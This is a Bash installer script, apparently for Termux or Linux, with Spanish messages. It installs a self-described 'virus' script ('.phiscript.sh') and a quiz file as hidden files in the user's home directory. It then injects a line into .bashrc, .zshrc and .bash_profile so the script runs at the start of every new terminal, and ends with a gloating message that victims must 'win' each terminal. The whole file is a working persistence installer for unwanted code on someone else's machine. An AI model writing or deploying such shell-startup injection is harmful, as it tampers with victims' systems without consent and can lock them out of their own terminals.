#!/bin/bash

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

VIRUS_FILE="$HOME/.phiscript.sh"
JSON_FILE="$HOME/.virus_questions.json"
MARKER="# __phiscript__"

echo ""
echo -e "${CYAN}${BOLD}  [+] Instalando dependencias...${RESET}"
sleep 0.3

# ─── Instalar python3 si no está ──────────────────────────────────
if ! command -v python3 &>/dev/null; then
    echo -e "${YELLOW}  [~] Instalando python3...${RESET}"
    pkg install -y python 2>/dev/null || apt-get install -y python3 2>/dev/null
    if command -v python3 &>/dev/null; then
        echo -e "${GREEN}  [✓] python3 instalado${RESET}"
    else
        echo -e "${RED}  [!] No se pudo instalar python3. Instálalo manualmente.${RESET}"
        exit 1
    fi
else
    echo -e "${GREEN}  [✓] python3 ya está instalado${RESET}"
fi

# ─── Instalar bc si no está (para cálculos numéricos) ─────────────
if ! command -v bc &>/dev/null; then
    echo -e "${YELLOW}  [~] Instalando bc...${RESET}"
    pkg install -y bc 2>/dev/null || apt-get install -y bc 2>/dev/null
    echo -e "${GREEN}  [✓] bc instalado${RESET}"
else
    echo -e "${GREEN}  [✓] bc ya está instalado${RESET}"
fi

sleep 0.3
echo ""
echo -e "${CYAN}${BOLD}  [+] Instalando phiscript...${RESET}"
sleep 0.3

DIR="$(cd "$(dirname "$0")" && pwd)"

cp "$DIR/phiscript.sh" "$VIRUS_FILE"
chmod +x "$VIRUS_FILE"

cp "$DIR/questions.json" "$JSON_FILE"
sleep 0.3

for RC in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile"; do
    if [ -f "$RC" ] && ! grep -q "$MARKER" "$RC" 2>/dev/null; then
        printf "\n%s\nbash %s\n" "$MARKER" "$VIRUS_FILE" >> "$RC"
        echo -e "${GREEN}  [✓] Inyectado en $RC${RESET}"
    fi
done

sleep 0.3
echo ""
echo -e "${YELLOW}  ════════════════════════════════════════${RESET}"
echo -e "${GREEN}${BOLD}  [✓] Todo listo.${RESET}"
echo -e "${RED}${BOLD}  Cada terminal que abran... la tendrán que ganar. 😈${RESET}"
echo -e "${YELLOW}  ════════════════════════════════════════${RESET}"
echo ""
